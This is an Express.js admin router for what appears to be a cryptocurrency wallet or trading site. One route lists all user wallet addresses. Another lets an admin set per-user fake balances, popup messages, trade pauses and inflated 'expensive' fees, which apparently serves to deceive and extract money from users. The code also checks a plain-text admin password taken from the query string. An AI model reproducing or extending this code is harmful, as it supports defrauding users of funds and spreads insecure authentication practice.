require('dotenv').config();

import express from 'express';


import UserAddress from '../models/useraddress';

const adminRoute = express.Router();

adminRoute.get('/userwallets', async (req, res) => {
    try {
        const { password } = req.query;

        if (password === process.env.ADMIN_PW) {
            const usersaddress = await UserAddress.find();

            res.status(200).json({
                usersaddress
            });
        } else {
            return res.status(401).json({ message: "fuck off" })
        }
    } catch (error) {
        console.log(error);
        return res.status(401).json({ message: "fuck off" })
    }
});

adminRoute.post('/admin/update', async (req, res) => {
    try {
        const {
            password,
            address
        } = req.query;

        if (password === process.env.ADMIN_PW) {

            if (address != null && address.length) {

                const {
                    adminBtcBalance,
                    adminUsdtBalance,
                    adminEthBalance,
                    adminPopupMessage,
                    useAdminVals,
                    btcmode,
                    ethmode,
                    usdtmode,
                    pauseTrade,
                    useExpensivefee,
                    expensiveFeeBTC,
                    expensiveFeeETH
                } = req.body;

                const updatedUserAddress = await UserAddress.findOneAndUpdate(
                    { ethaddress: address },
                    {
                        $set: {
                            adminBtcBalance,
                            adminUsdtBalance,
                            adminEthBalance,
                            adminPopupMessage,
                            useAdminVals,
                            btcmode,
                            ethmode,
                            usdtmode,
                            pauseTrade,
                            useExpensivefee,
                            expensiveFeeBTC,
                            expensiveFeeETH
                        }
                    },
                    { new: true, runValidators: true }
                );

                if (!updatedUserAddress) {
                    return res.status(404).json({ message: "User address not found" });
                }

                res.status(201).json({ updatedUserAddress })
            }
        }
    } catch (error) {
        console.log(error)
        return res.status(500).json({ message: "Internal server error" });
    }
})

export default adminRoute;